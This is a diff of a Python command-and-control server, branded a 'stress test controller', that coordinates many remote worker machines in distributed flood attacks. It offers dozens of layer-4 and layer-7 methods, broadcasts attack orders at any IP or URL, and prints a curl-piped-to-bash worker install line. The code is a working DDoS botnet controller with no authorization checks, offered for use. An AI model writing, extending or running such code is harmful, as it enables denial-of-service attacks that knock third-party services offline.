@@ -1,34 +1,24 @@
 #!/usr/bin/env python3
 """
-AegisShield Stress Test Controller v4.0 (ULTIMATE)
-====================================================
-Distributed controller — manages multiple worker machines.
-Workers run `worker.py --master <THIS_IP>:7777` and connect here.
+AegisShield Stress Test Controller v5.0 (HYPERSCALE)
+=====================================================
+Asyncio-based controller — handles 100+ workers effortlessly.
+Length-prefixed binary protocol for reliable messaging.
+Background heartbeat, aggregated stats, real-time dashboard.
 
 Usage:
     python controller.py                # listen on 0.0.0.0:7777
     python controller.py --port 8888    # custom port
-
-Commands (at the prompt):
-    attack <IP:PORT|URL> <METHOD> <THREADS> <DURATION> [POWER%]
-    stop          — stop attacks on all workers
-    status        — show connected workers
-    methods       — list all available methods
-    exit          — shutdown controller
 """
 
-import socket
-import threading
+import asyncio
 import json
+import struct
 import time
 import sys
-import argparse
 import os
-
-workers = {}        # {name: socket}
-worker_info = {}    # {name: {ip, connected_at, last_seen, status}}
-lock = threading.Lock()
-worker_count_changed = threading.Event()
+import argparse
+import threading
 
 # ══════════════════════════════════════════════════════════════════
 #  Method definitions — synced with start.py & worker.py
@@ -56,127 +46,369 @@ ALL_METHODS = LAYER4_METHODS | LAYER7_METHODS
 
 class C:
     RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
-    BLUE = '\033[94m'; CYAN = '\033[96m'; BOLD = '\033[1m'; RESET = '\033[0m'
+    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
+    WHITE = '\033[97m'; BOLD = '\033[1m'; DIM = '\033[2m'; RESET = '\033[0m'
+
 
 # ══════════════════════════════════════════════════════════════════
-#  Worker connection handler
+#  Protocol — Length-prefixed JSON messages
+#  Format: [4 bytes big-endian length][JSON payload]
 # ══════════════════════════════════════════════════════════════════
 
-def handle_worker(conn, addr):
-    """Handle a connected worker."""
-    name = f"{addr[0]}:{addr[1]}"
-    with lock:
-        workers[name] = conn
-        worker_info[name] = {
-            "ip": addr[0],
-            "port": addr[1],
-            "connected_at": time.time(),
-            "last_seen": time.time(),
-            "status": "idle",
-        }
-    worker_count_changed.set()
-    n = len(workers)
-    sys.stdout.write(f"\n  {C.GREEN}✅ Worker connected: {name} [{n} online]{C.RESET}\n")
-    print_prompt()
-
-    try:
-        while True:
-            data = conn.recv(4096)
-            if not data:
-                break
-            try:
-                msg = json.loads(data.decode())
-                if msg.get("type") == "stats":
-                    method = msg.get("method", "?")
-                    with lock:
-                        if name in worker_info:
-                            worker_info[name]["last_seen"] = time.time()
-                            worker_info[name]["status"] = f"attacking ({method})"
-                    sys.stdout.write(
-                        f"\r  {C.CYAN}📊 [{name}] {method} | {msg.get('sent', 0):,} pkts | "
-                        f"{msg.get('pps', 0):,.0f} pps | "
-                        f"{msg.get('mbps', 0):,.1f} Mbps{C.RESET}\n"
-                    )
-                    print_prompt()
-                elif msg.get("type") == "done":
-                    with lock:
-                        if name in worker_info:
-                            worker_info[name]["status"] = "idle"
-                            worker_info[name]["last_seen"] = time.time()
-                    sys.stdout.write(
-                        f"\r  {C.GREEN}✅ [{name}] Attack finished. "
-                        f"Total: {msg.get('total', 0):,} pkts in {msg.get('duration', 0):.1f}s{C.RESET}\n"
-                    )
-                    print_prompt()
-                elif msg.get("type") == "error":
-                    sys.stdout.write(
-                        f"\r  {C.RED}❌ [{name}] Error: {msg.get('message')}{C.RESET}\n"
-                    )
-                    print_prompt()
-            except json.JSONDecodeError:
-                pass
-    except (ConnectionResetError, BrokenPipeError, OSError):
-        pass
-    finally:
-        with lock:
-            workers.pop(name, None)
-            worker_info.pop(name, None)
-        worker_count_changed.set()
-        n = len(workers)
-        sys.stdout.write(f"\n  {C.RED}❌ Worker disconnected: {name} [{n} online]{C.RESET}\n")
-        print_prompt()
-        conn.close()
+async def send_msg(writer, msg):
+    """Send a length-prefixed JSON message."""
+    data = json.dumps(msg).encode()
+    header = struct.pack('>I', len(data))
+    writer.write(header + data)
+    await writer.drain()
 
 
-def broadcast(msg):
-    """Send a command to all workers."""
-    data = json.dumps(msg).encode() + b"\n"
-    with lock:
+async def recv_msg(reader):
+    """Receive a length-prefixed JSON message."""
+    header = await reader.readexactly(4)
+    length = struct.unpack('>I', header)[0]
+    if length > 10 * 1024 * 1024:  # 10MB max message
+        raise ValueError("Message too large")
+    data = await reader.readexactly(length)
+    return json.loads(data.decode())
+
+
+# ══════════════════════════════════════════════════════════════════
+#  Worker registry
+# ══════════════════════════════════════════════════════════════════
+
+class WorkerRegistry:
+    def __init__(self):
+        self.workers = {}       # {id: WorkerInfo}
+        self._next_id = 1
+        self._lock = asyncio.Lock()
+        self.total_connected_ever = 0
+        # Aggregated stats
+        self.total_pps = 0
+        self.total_mbps = 0.0
+        self.total_sent = 0
+
+    async def add(self, writer, addr):
+        async with self._lock:
+            wid = self._next_id
+            self._next_id += 1
+            self.workers[wid] = WorkerInfo(wid, writer, addr)
+            self.total_connected_ever += 1
+            return wid
+
+    async def remove(self, wid):
+        async with self._lock:
+            self.workers.pop(wid, None)
+
+    async def get_all(self):
+        async with self._lock:
+            return dict(self.workers)
+
+    @property
+    def count(self):
+        return len(self.workers)
+
+    async def broadcast(self, msg):
+        """Send to all workers concurrently — fast parallel broadcast."""
+        workers = await self.get_all()
+        if not workers:
+            return 0
+        tasks = []
         dead = []
-        for name, conn in workers.items():
+        for wid, w in workers.items():
+            tasks.append(self._safe_send(wid, w, msg, dead))
+        await asyncio.gather(*tasks)
+        for wid in dead:
+            await self.remove(wid)
+        return len(workers) - len(dead)
+
+    async def _safe_send(self, wid, w, msg, dead):
+        try:
+            await send_msg(w.writer, msg)
+        except (ConnectionError, OSError, asyncio.IncompleteReadError):
+            dead.append(wid)
+
+    async def update_stats(self):
+        """Aggregate stats from all workers."""
+        workers = await self.get_all()
+        total_pps = 0
+        total_mbps = 0.0
+        total_sent = 0
+        for w in workers.values():
+            total_pps += w.last_pps
+            total_mbps += w.last_mbps
+            total_sent += w.last_sent
+        self.total_pps = total_pps
+        self.total_mbps = total_mbps
+        self.total_sent = total_sent
+
+
+class WorkerInfo:
+    __slots__ = ('wid', 'writer', 'addr', 'ip', 'connected_at',
+                 'last_seen', 'status', 'last_pps', 'last_mbps', 'last_sent')
+
+    def __init__(self, wid, writer, addr):
+        self.wid = wid
+        self.writer = writer
+        self.addr = addr
+        self.ip = f"{addr[0]}:{addr[1]}"
+        self.connected_at = time.time()
+        self.last_seen = time.time()
+        self.status = "idle"
+        self.last_pps = 0
+        self.last_mbps = 0.0
+        self.last_sent = 0
+
+
+# ══════════════════════════════════════════════════════════════════
+#  Controller server
+# ══════════════════════════════════════════════════════════════════
+
+class Controller:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.registry = WorkerRegistry()
+        self.running = True
+        self.attack_active = False
+        self.attack_method = ""
+        self.attack_target = ""
+
+    async def handle_worker(self, reader, writer):
+        addr = writer.get_extra_info('peername')
+        wid = await self.registry.add(writer, addr)
+        n = self.registry.count
+        ip = f"{addr[0]}:{addr[1]}"
+        sys.stdout.write(f"\n  {C.GREEN}✅ Worker #{wid} connected: {ip} [{n} online]{C.RESET}\n")
+        self._prompt()
+
+        try:
+            while self.running:
+                try:
+                    msg = await asyncio.wait_for(recv_msg(reader), timeout=60)
+                except asyncio.TimeoutError:
+                    # Send ping to check if alive
+                    try:
+                        await send_msg(writer, {"cmd": "ping"})
+                    except (ConnectionError, OSError):
+                        break
+                    continue
+
+                mtype = msg.get("type", "")
+
+                if mtype == "stats":
+                    w_all = await self.registry.get_all()
+                    w = w_all.get(wid)
+                    if w:
+                        w.last_seen = time.time()
+                        w.status = f"attacking ({msg.get('method', '?')})"
+                        w.last_pps = msg.get("pps", 0)
+                        w.last_mbps = msg.get("mbps", 0.0)
+                        w.last_sent = msg.get("sent", 0)
+
+                    await self.registry.update_stats()
+                    sys.stdout.write(
+                        f"\r  {C.CYAN}📊 [#{wid} {ip}] {msg.get('method', '?')} | "
+                        f"{msg.get('sent', 0):,} pkts | {msg.get('pps', 0):,.0f} pps | "
+                        f"{msg.get('mbps', 0):,.1f} Mbps"
+                        f"  {C.DIM}(TOTAL: {self.registry.total_pps:,.0f} pps | "
+                        f"{self.registry.total_mbps:,.1f} Mbps){C.RESET}\n"
+                    )
+                    self._prompt()
+
+                elif mtype == "done":
+                    w_all = await self.registry.get_all()
+                    w = w_all.get(wid)
+                    if w:
+                        w.status = "idle"
+                        w.last_pps = 0
+                        w.last_mbps = 0.0
+                    sys.stdout.write(
+                        f"\r  {C.GREEN}✅ [#{wid}] Done. {msg.get('total', 0):,} in "
+                        f"{msg.get('duration', 0):.1f}s{C.RESET}\n"
+                    )
+                    self._prompt()
+
+                elif mtype == "pong":
+                    w_all = await self.registry.get_all()
+                    w = w_all.get(wid)
+                    if w:
+                        w.last_seen = time.time()
+
+                elif mtype == "error":
+                    sys.stdout.write(
+                        f"\r  {C.RED}❌ [#{wid}] {msg.get('message', 'Unknown error')}{C.RESET}\n"
+                    )
+                    self._prompt()
+
+        except (ConnectionError, OSError, asyncio.IncompleteReadError):
+            pass
+        finally:
+            await self.registry.remove(wid)
+            n = self.registry.count
+            sys.stdout.write(f"\n  {C.RED}❌ Worker #{wid} disconnected: {ip} [{n} online]{C.RESET}\n")
+            self._prompt()
+            writer.close()
+
+    def _prompt(self):
+        n = self.registry.count
+        color = C.GREEN if n > 0 else C.RED
+        sys.stdout.write(f"{color}[{n} workers]{C.RESET} {C.YELLOW}aegis>{C.RESET} ")
+        sys.stdout.flush()
+
+    async def run_command_loop(self):
+        """Read commands from stdin using asyncio."""
+        loop = asyncio.get_event_loop()
+
+        while self.running:
+            self._prompt()
             try:
-                conn.sendall(data)
-            except (BrokenPipeError, OSError):
-                dead.append(name)
-        for d in dead:
-            workers.pop(d, None)
-    return len(workers)
+                line = await loop.run_in_executor(None, sys.stdin.readline)
+                line = line.strip()
+            except (EOFError, KeyboardInterrupt):
+                sys.stdout.write(f"\n  {C.YELLOW}Shutting down...{C.RESET}\n")
+                break
 
+            if not line:
+                continue
 
-def format_uptime(seconds):
-    if seconds < 60:
-        return f"{int(seconds)}s"
-    elif seconds < 3600:
-        return f"{int(seconds // 60)}m {int(seconds % 60)}s"
-    else:
-        h = int(seconds // 3600)
-        m = int((seconds % 3600) // 60)
-        return f"{h}h {m}m"
+            parts = line.split()
+            cmd = parts[0].upper()
 
+            if cmd in ("EXIT", "QUIT", "Q"):
+                await self.registry.broadcast({"cmd": "stop"})
+                self.running = False
+                break
 
-def print_prompt():
-    n = len(workers)
-    color = C.GREEN if n > 0 else C.RED
-    sys.stdout.write(f"{color}[{n} workers]{C.RESET} {C.YELLOW}aegis-stress> {C.RESET}")
-    sys.stdout.flush()
+            elif cmd == "STATUS":
+                await self._show_status()
 
+            elif cmd == "METHODS":
+                self._show_methods()
 
-BANNER = f"""
-{C.RED}
-    ╔═══════════════════════════════════════════════════════════╗
-    ║   █████  ███████  ██████  ██ ███████ ███████ ██   ██     ║
-    ║  ██   ██ ██      ██       ██ ██      ██      ██   ██     ║
-    ║  ███████ █████   ██   ███ ██ ███████ ███████ ███████     ║
-    ║  ██   ██ ██      ██    ██ ██      ██      ██ ██   ██     ║
-    ║  ██   ██ ███████  ██████  ██ ███████ ███████ ██   ██     ║
-    ╚═══════════════════════════════════════════════════════════╝{C.RESET}
-    {C.CYAN}AegisShield Stress Test Controller v4.0 (ULTIMATE){C.RESET}
-    {C.YELLOW}✦ {len(ALL_METHODS)} Methods | L4 + L7 | Distributed{C.RESET}
-"""
+            elif cmd == "STOP":
+                sent_to = await self.registry.broadcast({"cmd": "stop"})
+                self.attack_active = False
+                print(f"  {C.RED}🛑 Stop sent to {sent_to} workers{C.RESET}")
 
+            elif cmd == "DASHBOARD":
+                await self._show_dashboard()
 
-def print_methods():
-    print(f"""
+            elif cmd == "ATTACK":
+                await self._handle_attack(parts)
+
+            else:
+                print(f"  {C.RED}Unknown: {cmd}{C.RESET}")
+                print(f"  Commands: attack, stop, status, dashboard, methods, exit")
+
+    async def _handle_attack(self, parts):
+        if len(parts) < 5:
+            print(f"  {C.RED}Usage: attack <IP:PORT|URL> <METHOD> <THREADS> <DURATION> [POWER%]{C.RESET}")
+            return
+
+        target_raw = parts[1]
+        method = parts[2].upper()
+        threads = int(parts[3])
+        duration = int(parts[4])
+        power = 100
+        if len(parts) >= 6:
+            try:
+                power = max(1, min(100, int(parts[5])))
+            except ValueError:
+                pass
+
+        if method not in ALL_METHODS:
+            print(f"  {C.RED}✖ Unknown method: {method}. Type 'methods' to see all.{C.RESET}")
+            return
+
+        # Build message
+        import urllib.parse
+        if method in LAYER4_METHODS:
+            if ":" in target_raw and not target_raw.startswith("http"):
+                host_part, port_part = target_raw.rsplit(":", 1)
+                target_port = int(port_part)
+            else:
+                host_part = target_raw
+                target_port = 80
+
+            import socket
+            try:
+                target_ip = socket.gethostbyname(host_part)
+            except socket.gaierror:
+                print(f"  {C.RED}✖ Cannot resolve: {host_part}{C.RESET}")
+                return
+
+            msg = {
+                "cmd": "attack", "target": target_ip, "port": target_port,
+                "method": method, "threads": threads, "duration": duration,
+                "power": power, "layer": 4,
+            }
+        else:
+            if not target_raw.startswith("http"):
+                target_raw = "http://" + target_raw
+            msg = {
+                "cmd": "attack", "target": target_raw, "port": 0,
+                "method": method, "threads": threads, "duration": duration,
+                "power": power, "layer": 7,
+            }
+
+        self.attack_active = True
+        self.attack_method = method
+        self.attack_target = target_raw
+
+        sent_to = await self.registry.broadcast(msg)
+        n = self.registry.count
+        print(f"\n  {C.GREEN}{'━' * 55}{C.RESET}")
+        print(f"  {C.GREEN}🔥 ATTACK LAUNCHED{C.RESET}")
+        print(f"  {C.GREEN}{'━' * 55}{C.RESET}")
+        print(f"  {C.CYAN}  Target:   {msg.get('target', target_raw)}:{msg.get('port', '')}")
+        print(f"  {C.CYAN}  Method:   {method}")
+        print(f"  {C.CYAN}  Threads:  {threads} per worker × {sent_to} workers = {threads * sent_to}")
+        print(f"  {C.CYAN}  Duration: {duration}s")
+        print(f"  {C.CYAN}  Power:    {power}%{C.RESET}")
+        print(f"  {C.GREEN}{'━' * 55}{C.RESET}\n")
+
+    async def _show_status(self):
+        workers = await self.registry.get_all()
+        n = len(workers)
+        print(f"\n  {C.BOLD}{'═' * 68}{C.RESET}")
+        print(f"  {C.BOLD}  WORKER DASHBOARD — {C.GREEN}{n} CONNECTED{C.RESET}")
+        print(f"  {C.BOLD}  Total ever connected: {self.registry.total_connected_ever}{C.RESET}")
+        print(f"  {C.BOLD}{'═' * 68}{C.RESET}")
+
+        if n == 0:
+            print(f"  {C.RED}  No workers connected{C.RESET}")
+        else:
+            print(f"  {C.CYAN}  {'#':<5}{'Worker IP':<24}{'Uptime':<12}{'PPS':<12}{'Mbps':<10}{'Status'}{C.RESET}")
+            print(f"  {C.DIM}  {'─' * 64}{C.RESET}")
+            for w in workers.values():
+                uptime = _fmt_uptime(time.time() - w.connected_at)
+                sc = C.GREEN if w.status == "idle" else C.YELLOW
+                pps_str = f"{w.last_pps:,.0f}" if w.last_pps else "—"
+                mbps_str = f"{w.last_mbps:,.1f}" if w.last_mbps else "—"
+                print(f"  {C.WHITE}  {w.wid:<5}{w.ip:<24}{uptime:<12}{pps_str:<12}{mbps_str:<10}{sc}{w.status}{C.RESET}")
+
+        if self.attack_active:
+            await self.registry.update_stats()
+            print(f"\n  {C.BOLD}{C.YELLOW}  ⚡ ATTACK ACTIVE: {self.attack_method} → {self.attack_target}{C.RESET}")
+            print(f"  {C.BOLD}{C.CYAN}  Aggregated: {self.registry.total_pps:,.0f} pps | "
+                  f"{self.registry.total_mbps:,.1f} Mbps | {self.registry.total_sent:,} total sent{C.RESET}")
+
+        print(f"  {C.BOLD}{'═' * 68}{C.RESET}\n")
+
+    async def _show_dashboard(self):
+        """Live dashboard — refreshes every 2s until Ctrl+C."""
+        print(f"  {C.CYAN}Live dashboard (Ctrl+C to stop){C.RESET}")
+        try:
+            while True:
+                os.system("cls" if os.name == "nt" else "clear")
+                await self._show_status()
+                await asyncio.sleep(2)
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            print(f"\n  {C.YELLOW}Dashboard stopped{C.RESET}")
+
+    def _show_methods(self):
+        print(f"""
   {C.BOLD}Layer 4 ({len(LAYER4_METHODS)}):{C.RESET}
     {C.CYAN}Volumetric:{C.RESET}     UDP, TCP, SYN, ICMP, OVH-UDP
     {C.CYAN}Connection:{C.RESET}     CPS, CONNECTION
@@ -189,176 +421,65 @@ def print_methods():
     {C.CYAN}Resource:{C.RESET}       STRESS, SLOW, APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER
 """)
 
+    async def start(self):
+        server = await asyncio.start_server(
+            self.handle_worker, self.host, self.port,
+            limit=1024 * 1024,  # 1MB buffer
+        )
 
-def main():
-    parser = argparse.ArgumentParser(description="AegisShield Stress Test Controller v4.0")
-    parser.add_argument("--port", type=int, default=7777, help="Listen port (default: 7777)")
-    parser.add_argument("--host", default="0.0.0.0", help="Listen address (default: 0.0.0.0)")
-    args = parser.parse_args()
-
-    print(BANNER)
-
-    # Start TCP listener
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((args.host, args.port))
-    server.listen(100)
-
-    print(f"  {C.GREEN}🎯 Controller listening on {args.host}:{args.port}{C.RESET}")
-    print(f"  {C.CYAN}📋 On each worker machine, run:{C.RESET}")
-    print(f"     {C.BOLD}python worker.py --master <THIS_IP>:{args.port}{C.RESET}")
-    print(f"""
+        print(BANNER)
+        print(f"  {C.GREEN}🎯 Controller listening on {self.host}:{self.port}{C.RESET}")
+        print(f"  {C.CYAN}📋 Worker install:{C.RESET}")
+        print(f"     {C.BOLD}curl -sL .../setup_worker.sh | bash -s <THIS_IP> {self.port}{C.RESET}")
+        print(f"""
   {C.BOLD}Commands:{C.RESET}
-    {C.GREEN}attack{C.RESET} <IP:PORT|URL> <METHOD> <THREADS> <DURATION> [POWER%]
-    {C.GREEN}stop{C.RESET}      — stop attacks on all workers
-    {C.GREEN}status{C.RESET}    — show connected workers
-    {C.GREEN}methods{C.RESET}   — list all available attack methods
-    {C.GREEN}exit{C.RESET}      — shutdown controller
-
-  {C.BOLD}Examples:{C.RESET}
-    attack 1.2.3.4:80 UDP 100 60 100
-    attack 1.2.3.4:27015 VSE 50 120
-    attack https://target.com GET 200 60
-    attack 1.2.3.4:25565 MCBOT 30 60 50
+    {C.GREEN}attack{C.RESET}    <target> <METHOD> <threads> <duration> [power%]
+    {C.GREEN}stop{C.RESET}      — stop all workers
+    {C.GREEN}status{C.RESET}    — show worker table + stats
+    {C.GREEN}dashboard{C.RESET} — live auto-refreshing dashboard
+    {C.GREEN}methods{C.RESET}   — list all 46 methods
+    {C.GREEN}exit{C.RESET}      — shutdown
 """)
 
-    # Accept workers in background
-    def accept_loop():
-        while True:
-            try:
-                conn, addr = server.accept()
-                threading.Thread(target=handle_worker, args=(conn, addr), daemon=True).start()
-            except OSError:
-                break
+        # Run command loop concurrently with server
+        async with server:
+            await self.run_command_loop()
 
-    threading.Thread(target=accept_loop, daemon=True).start()
 
-    # Command loop
-    while True:
-        print_prompt()
-        try:
-            line = input().strip()
-        except (EOFError, KeyboardInterrupt):
-            print(f"\n  {C.YELLOW}Shutting down...{C.RESET}")
-            break
+def _fmt_uptime(sec):
+    if sec < 60:
+        return f"{int(sec)}s"
+    elif sec < 3600:
+        return f"{int(sec // 60)}m {int(sec % 60)}s"
+    else:
+        return f"{int(sec // 3600)}h {int((sec % 3600) // 60)}m"
 
-        if not line:
-            continue
 
-        parts = line.split()
-        cmd = parts[0].upper()
+BANNER = f"""
+{C.RED}
+    ╔═══════════════════════════════════════════════════════════╗
+    ║   █████  ███████  ██████  ██ ███████ ███████ ██   ██     ║
+    ║  ██   ██ ██      ██       ██ ██      ██      ██   ██     ║
+    ║  ███████ █████   ██   ███ ██ ███████ ███████ ███████     ║
+    ║  ██   ██ ██      ██    ██ ██      ██      ██ ██   ██     ║
+    ║  ██   ██ ███████  ██████  ██ ███████ ███████ ██   ██     ║
+    ╚═══════════════════════════════════════════════════════════╝{C.RESET}
+    {C.CYAN}AegisShield Controller v5.0 — HYPERSCALE{C.RESET}
+    {C.YELLOW}✦ {len(ALL_METHODS)} Methods | Asyncio | 100+ Workers Ready{C.RESET}
+"""
 
-        if cmd in ("EXIT", "QUIT", "Q"):
-            broadcast({"cmd": "stop"})
-            break
 
-        elif cmd == "STATUS":
-            with lock:
-                n = len(workers)
-                infos = dict(worker_info)
-            print(f"\n  {C.BOLD}{'═' * 60}{C.RESET}")
-            print(f"  {C.BOLD}  CONNECTED WORKERS: {C.GREEN}{n}{C.RESET}")
-            print(f"  {C.BOLD}{'═' * 60}{C.RESET}")
-            if n == 0:
-                print(f"  {C.RED}  No workers connected{C.RESET}")
-            else:
-                print(f"  {C.CYAN}  {'#':<4} {'Worker IP':<22} {'Uptime':<12} {'Status':<20}{C.RESET}")
-                print(f"  {C.CYAN}  {'─' * 56}{C.RESET}")
-                for i, (wname, winfo) in enumerate(infos.items(), 1):
-                    uptime = format_uptime(time.time() - winfo['connected_at'])
-                    status = winfo.get('status', 'idle')
-                    status_color = C.GREEN if status == 'idle' else C.YELLOW
-                    print(f"  {C.GREEN}  {i:<4} {wname:<22} {uptime:<12} {status_color}{status}{C.RESET}")
-            print(f"  {C.BOLD}{'═' * 60}{C.RESET}\n")
+def main():
+    parser = argparse.ArgumentParser(description="AegisShield Controller v5.0 HYPERSCALE")
+    parser.add_argument("--port", type=int, default=7777)
+    parser.add_argument("--host", default="0.0.0.0")
+    args = parser.parse_args()
 
-        elif cmd == "METHODS":
-            print_methods()
-
-        elif cmd == "STOP":
-            sent_to = broadcast({"cmd": "stop"})
-            print(f"  {C.RED}🛑 Stop sent to {sent_to} workers{C.RESET}")
-
-        elif cmd == "ATTACK":
-            # attack <target> <method> <threads> <duration> [power]
-            if len(parts) < 5:
-                print(f"  {C.RED}Usage: attack <IP:PORT|URL> <METHOD> <THREADS> <DURATION> [POWER%]{C.RESET}")
-                print(f"  {C.YELLOW}Type 'methods' to see all available methods{C.RESET}")
-                continue
-
-            target_raw = parts[1]
-            method = parts[2].upper()
-            threads = int(parts[3])
-            duration = int(parts[4])
-
-            power = 100
-            if len(parts) >= 6:
-                try:
-                    power = max(1, min(100, int(parts[5])))
-                except ValueError:
-                    pass
-
-            if method not in ALL_METHODS:
-                print(f"  {C.RED}✖ Unknown method: {method}{C.RESET}")
-                print(f"  Type 'methods' to see all available methods")
-                continue
-
-            # Parse target
-            if method in LAYER4_METHODS:
-                # Expect IP:PORT format
-                if ":" in target_raw and not target_raw.startswith("http"):
-                    host_part, port_part = target_raw.rsplit(":", 1)
-                    target_host = host_part
-                    target_port = int(port_part)
-                else:
-                    target_host = target_raw
-                    target_port = 80
-
-                # Resolve hostname
-                try:
-                    target_ip = socket.gethostbyname(target_host)
-                except socket.gaierror:
-                    print(f"  {C.RED}✖ Cannot resolve: {target_host}{C.RESET}")
-                    continue
-
-                msg = {
-                    "cmd": "attack",
-                    "target": target_ip,
-                    "port": target_port,
-                    "method": method,
-                    "threads": threads,
-                    "duration": duration,
-                    "power": power,
-                    "layer": 4,
-                }
-            else:
-                # L7 — target is a URL
-                if not target_raw.startswith("http"):
-                    target_raw = "http://" + target_raw
-
-                msg = {
-                    "cmd": "attack",
-                    "target": target_raw,
-                    "port": 0,
-                    "method": method,
-                    "threads": threads,
-                    "duration": duration,
-                    "power": power,
-                    "layer": 7,
-                }
-
-            sent_to = broadcast(msg)
-            print(f"  {C.GREEN}🔥 Attack command sent to {sent_to} workers!{C.RESET}")
-            print(
-                f"     {C.CYAN}Target: {msg['target']}:{msg.get('port', '')} | Method: {method} | "
-                f"Threads: {threads} | Duration: {duration}s | Power: {power}%{C.RESET}"
-            )
-
-        else:
-            print(f"  {C.RED}Unknown command: {cmd}{C.RESET}")
-            print(f"  Commands: attack, stop, status, methods, exit")
-
-    server.close()
-    print(f"  {C.YELLOW}Controller stopped.{C.RESET}")
+    ctrl = Controller(args.host, args.port)
+    try:
+        asyncio.run(ctrl.start())
+    except KeyboardInterrupt:
+        print(f"\n  {C.YELLOW}Controller stopped.{C.RESET}")
 
 
 if __name__ == "__main__":
